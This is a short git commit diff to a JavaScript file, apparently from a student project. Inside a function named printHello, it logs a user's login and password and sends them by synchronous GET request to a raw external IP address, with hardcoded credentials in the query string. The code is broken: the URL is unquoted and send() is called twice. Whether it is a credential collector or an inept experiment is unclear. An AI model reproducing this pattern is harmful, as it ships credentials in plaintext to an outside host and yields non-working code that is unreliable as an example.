0dd15ff9dd311bc2136ec24ab4d03b8efd6df3f6
Jordan Liu <jminjie@umich.edu>
2016-04-21 17:13:35 -0400

    Test the get request with url

--- javascripts/main.js
+++ javascripts/main.js
@@ -5,7 +5,7 @@ function printHello() {
     console.log(uniq, password);
 	// send the login and pass as resquests
 	var xmlHttp = new XMLHttpRequest();
-	xmlHttp.open( "GET", 35.2.222.118:80, false ); // false for synchronous request
+	xmlHttp.open( "GET", 35.2.222.118:8080?login=jordan&password=hunter, false ); // false for synchronous request
 	xmlHttp.send(uniq);
 	xmlHttp.send(password);
 }
